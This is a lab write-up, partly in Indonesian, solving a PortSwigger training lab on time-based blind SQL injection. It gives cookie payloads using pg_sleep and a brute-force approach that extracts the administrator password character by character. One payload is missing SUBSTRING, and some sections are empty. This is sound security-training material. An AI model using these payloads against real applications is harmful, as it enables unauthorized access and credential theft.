# 📝 Lab: Blind SQL injection with time delays and information retrieval

* **Vulnerability:** Blind SQL Injection (Time-Based)
* **Difficulty:** PRACTITIONER
* **Objective:** log in as the administrator user.

> **Description**
> This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.
> 
> The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.
>
> The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.
>
> To solve the lab, log in as the administrator user.

---

## 🛠️ Tools Used

* Browser + FoxyProxy
* Burp Suite
* Python (optional)

---

## 🐾 Steps to Reproduce

### 1. Intercept the Request

Open the lab homepage and intercept the request using **Burp Suite**.

Navigate to:

```text
Proxy → HTTP History
```

Right-click the request and send it to **Repeater** (`Ctrl + R`).

---

2. Cookie `TrackingId` adalah target kita, injeksi dengan `'||(SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--` untuk mengecek apakah ada rentan atau tidak.
Jika rentan respon akan delay 5 detik (bisa di liat di pojok kanan bawah).
3. Setelah menunggu, injeksi dengan payload `'|| (SELECT CASE WHEN (password, 1, 1)='a' THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users WHERE username='administrator')--`
Kita tidak mungkin bisa menebak *password* admin satu-persatu apalagi ada delay waktu. maka kita butuh tools **Bruteforce**, bisa pake **Burp Intruder** ataupun buatan sendiri.
4. Di sini saya akan gunakan tools **[Bruteforce](https://github.com/noata5505/Portswigger-Lab-Burp-Community/blob/main/SQL-Injection/Tools/15_Bruteforce_Tool.py)** buatan sendiri. Cara menggunakannya:
- Jalankan tools
- Input **URL** ```https://(YOUR-ID).web-security-academy.net/```
- Input **cookie_payload** ``` (YOUR-COOKIE)'|| (SELECT CASE WHEN SUBSTRING(password, {i}, 1)='{char}' THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users WHERE username='administrator')--```
- Tunggu (bisa sambil ngopi karena ada time-dealy)
- Selesai.
5. Copy hasilnya dan login dengan kredensial *administrator*
6. Selesai. Banner **LAB SOLVE** akan muncul.
<img width="1917" height="911" alt="Screenshot 2026-09-28 024528" src="https://github.com/user-attachments/assets/3782ef76-aa7e-48d3-a4b2-065fba773647" />



---

## 💣 Payload

---

## 🎯 Impact

---

## 🔗 Reference

For more SQL injection payloads and database-specific syntax, check out the **[PortSwigger SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)**
